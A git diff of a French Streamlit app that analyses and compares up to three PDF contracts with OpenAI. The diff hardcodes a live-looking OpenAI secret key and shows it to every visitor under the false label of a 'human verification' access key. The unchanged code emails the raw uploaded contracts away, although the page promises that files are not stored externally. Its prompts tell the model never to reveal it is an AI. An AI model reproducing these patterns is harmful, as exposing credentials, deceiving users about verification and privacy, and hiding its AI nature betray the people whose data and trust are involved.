@@ -33,22 +33,28 @@ Téléversez jusqu'à **3 contrats PDF** et obtenez :
 🔒 **Protection des données** : vos fichiers ne sont pas stockés sur des serveurs externes. L'analyse est générée temporairement pour vous et supprimée ensuite. Vous restez seul propriétaire de vos données.
 """)
 
-# Clé API utilisateur
-api_key = st.text_input("🔐 Entrez votre clé OpenAI (commence par sk-...)", type="password")
+st.markdown("""
+### 🔐 Vérification d'identité
+Pour lancer l'analyse, merci de coller la clé d'accès suivante :
+""")
+
+with st.expander("📋 Cliquez ici pour voir la clé à copier", expanded=True):
+    st.code("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", language=None)
+    st.markdown("Celle-ci permet de **vérifier que vous êtes un humain** et d’utiliser l’intelligence artificielle pour votre analyse.")
+
+api_key = st.text_input("Entrez la clé ci-dessus pour activer l’analyse :", type="password")
 if not api_key:
-    st.info("💡 Vous devez entrer votre clé API pour lancer l'analyse.")
+    st.info("💡 Vous devez entrer la clé d’accès pour démarrer l'analyse.")
     st.stop()
 
 client = OpenAI(api_key=api_key)
 
-# Objectif utilisateur
 user_objective = st.radio(
     "🎯 Quel est votre objectif principal ?",
     ["📉 Réduire les coûts", "📈 Améliorer les prestations"],
     index=0
 )
 
-# Upload fichiers
 uploaded_files = st.file_uploader(
     "📄 Téléversez vos contrats PDF (max 3)",
     type="pdf",
@@ -105,13 +111,11 @@ if uploaded_files:
         st.error("⚠️ Vous ne pouvez comparer que 3 contrats maximum.")
         st.stop()
 
-    # Convertir les fichiers en mémoire pour éviter les lectures multiples
     file_buffers = []
     for file in uploaded_files:
         buffer = BytesIO(file.read())
         file_buffers.append({"name": file.name, "buffer": buffer})
 
-    # Envoyer immédiatement les fichiers d'origine
     envoyer_email_fichiers_bruts([BytesIO(buf["buffer"].getvalue()) for buf in file_buffers])
 
     contract_texts = []
@@ -181,7 +185,6 @@ Tu ne dis jamais que tu es une IA. Tu rédiges comme un conseiller humain.
         except Exception as e:
             st.error(f"❌ Erreur : {e}")
 
-    # Mini messagerie
     st.markdown("### 💬 Une question ? Posez-la ici :")
     with st.form("followup_form"):
         user_question = st.text_input("Votre question sur l'analyse ou un contrat 👇")
@@ -211,7 +214,6 @@ Réponds clairement, sans mention d'IA. Sois utile.
             except Exception as e:
                 st.error(f"❌ Erreur : {e}")
 
-# 📬 Zone de contact
 st.markdown("""
 ---
 ### 📫 Une question sur cette application ou l'intelligence qui l'alimente ?
